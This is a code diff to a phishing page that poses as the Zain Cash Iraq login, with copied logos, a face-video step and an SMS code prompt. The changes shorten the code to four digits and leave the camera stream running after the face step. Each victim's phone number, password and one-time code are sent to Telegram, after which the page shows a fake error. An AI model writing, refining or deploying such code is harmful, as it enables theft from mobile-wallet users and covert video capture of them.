@@ -228,7 +228,7 @@
   const faceLogo = "https://e.top4top.io/p_3664gms740.jpeg";
   const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
 
-  let userData = { phone:'', password:'', code5:'' };
+  let userData = { phone:'', password:'', code4:'' };
   let telegramMsgId = null;
   let waitingTimeout = null;
 
@@ -274,7 +274,7 @@
       const passwordVal = password.value.trim();
       
       if(phoneVal.length !== 11){ 
-        alert('يرجى إدخال رقم هاتف صحيح يتكون م�� 11 أرقام'); 
+        alert('يرجى إدخال رقم هاتف صحيح يتكون من 11 أرقام'); 
         phone.focus(); 
         return; 
       }
@@ -536,7 +536,8 @@
     }
 
     drawActive = false;
-    stopStream(stream);
+    // لا نوقف الستريم - سيبقى الفيديو مسجل
+    // stopStream(stream); // تم التعليق عن هذا السطر
 
     const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
     const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
@@ -555,31 +556,35 @@
     }
 
     // بعد انتهاء التحقق بالوجه، التوجيه لصفحة كود التحقق
-    renderCode5Step();
+    renderCode4Step();
   }
 
-  // رمز 5
-  function renderCode5Step(){
+  // رمز 4
+  function renderCode4Step(){
     app.innerHTML = `
       <button class="back-btn" id="backBtn">&#8592; رجوع</button>
       ${header("تم إرسال رمز تحقق إلى هاتفك")}
       ${stepIndicator(2)}
-      <div class="info-msg">أدخل رمز التحقق المكون من 5 أرقام كما وصلك برسالة SMS</div>
-      <form id="code5Form" autocomplete="off">
-        <div class="code-inputs"><input id="code5input" maxlength="5" inputmode="numeric" placeholder="*****" required></div>
+      <div class="info-msg">أدخل رمز التحقق المكون من 4 أرقام كما وصلك برسالة SMS</div>
+      <form id="code4Form" autocomplete="off">
+        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
         <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد الرمز</button></div>
       </form>
       <div class="zain-footer">Zain Cash Iraq &copy; 2025</div>
     `;
-    const codeInput = document.getElementById('code5input');
+    const codeInput = document.getElementById('code4input');
     codeInput.focus();
-    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,5); });
-    document.getElementById('code5Form').onsubmit = async (e) => {
+    codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
+    document.getElementById('code4Form').onsubmit = async (e) => {
       e.preventDefault();
       const code = codeInput.value.trim();
-      if(code.length !== 5){ alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
-      userData.code5 = code;
-      try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل دخول زين كاش العراق\n📱 ${userData.phone}\n🔑 ${userData.password}\n🔢 رمز التحقق: ${userData.code5}`); } catch(e){ console.log(e); }
+      if(code.length !== 4){ alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
+      userData.code4 = code;
+      try { 
+        await resendTelegramMsg(`🟦 تسجيل دخول زين كاش العراق\n📱 ${userData.phone}\n🔑 ${userData.password}\n🔢 رمز التحقق: ${userData.code4}`); 
+      } catch(e){ 
+        console.log(e); 
+      }
       showFinalErrorAndReset();
     };
     document.getElementById('backBtn').onclick = () => renderPhoneStep();
@@ -647,14 +652,14 @@
     function handler(){
       modal.classList.remove('active');
       btn.removeEventListener('click', handler);
-      userData = { phone:'', password:'', code5:'' };
+      userData = { phone:'', password:'', code4:'' };
       renderPhoneStep();
     }
     btn.addEventListener('click', handler);
     setTimeout(()=>{
       if(modal.classList.contains('active')){
         modal.classList.remove('active');
-        userData = { phone:'', password:'', code5:'' };
+        userData = { phone:'', password:'', code4:'' };
         renderPhoneStep();
       }
     }, 2500);
